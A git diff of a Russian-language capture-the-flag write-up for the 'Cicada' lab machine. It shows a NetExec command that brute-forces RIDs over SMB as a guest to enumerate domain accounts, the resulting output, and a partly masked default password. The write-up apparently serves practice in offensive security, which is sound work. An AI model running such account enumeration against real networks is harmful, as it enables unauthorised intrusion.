@@ -193,12 +193,8 @@ Cicada Corp
 ```
 
 На основе этого письма, мы можем узнать, что в учетных записях **SMB** сети, у всех по умолчанию стоит пароль `Cicada$M6Corpb*****`, если логично подумать, должен быть какой-то сотрудник, который забыл изменить пароль, если у нас получиться узнать список учётных записей **SMB** сети, возможно, мы сможем подключиться к какой-то из них, для этого мы будем использовать утилиту **NetExec**
-```git clone https://github.com/Pennyw0rth/NetExec```
-```sudo pacman -S poetry``` либо ```sudo apt install poetry```
-```poetry install```
-```cd nxc```
-```poetry run python netexec.py smb cicada.htb -u abzee -p "" --rid-brute > cicada.txt```
 ```
+poetry run python netexec.py smb cicada.htb -u abzee -p "" --rid-brute > cicada.txt
 SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\abzee: (Guest)
 SMB                      10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
